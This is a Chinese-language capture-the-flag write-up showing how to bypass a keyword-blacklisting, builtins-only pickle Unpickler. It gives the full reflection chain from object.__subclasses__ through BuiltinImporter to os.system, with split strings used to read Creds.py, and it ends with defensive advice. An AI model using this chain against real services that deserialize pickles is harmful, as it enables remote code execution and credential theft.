# AuthLab 1.1

## 题目简述

修补版 EasyCreds 使用自定义 Unpickler：`find_class` 只允许 `builtins`，同时扫描原始 payload，禁用 `os`、`system`、`cat`、`import`、`open`、`Creds` 等关键词。这个防线仍允许从安全内建对象图中找到导入器，并可在运行时拼接黑名单词。

## 解题过程

从允许的 `builtins.object` 出发，调用 `object.__subclasses__()`，取环境中索引 120 的 `BuiltinImporter`。再通过允许的 `getattr` 取得 `load_module`，即可加载模块。所有敏感字符串都在运行时用 `operator.add` 拼接，原始 pickle 字节中不出现黑名单连续子串：

```text
'o' + 's'              -> 'os'
'sy' + 'stem'          -> 'system'
'ca' + 't Cr' + 'eds.py' -> 'cat Creds.py'
```

完整对象链是：

```python
BuiltinImporter = object.__subclasses__()[120]
load_module = BuiltinImporter().load_module
operator = load_module("operator")
os_module = load_module(operator.add("o", "s"))
system = getattr(os_module, operator.add("sy", "stem"))
system(operator.add(operator.add("ca", "t Cr"), "eds.py"))
```

这些操作都能用 `GLOBAL builtins ...`、`REDUCE`、`NEWOBJ`、memo 与元组 opcode 表达。提交 Base64 后，反序列化阶段执行命令并泄露：

```text
grey{4l1_aU7H_n0_p1Ay_M4k3_mE_4_d1ll_8oY}
```

## 方法总结

pickle 的危险能力不只来自直接导入 `os.system`；只要允许足够强的反射原语，就能从对象图重新获得导入器。对原始字节做关键词黑名单还会被分片和运行时拼接轻易绕过。真正安全的边界是不反序列化攻击者提供的 pickle；若要限制反序列化，必须用严格数据 schema，而不是尝试列举“危险单词”。
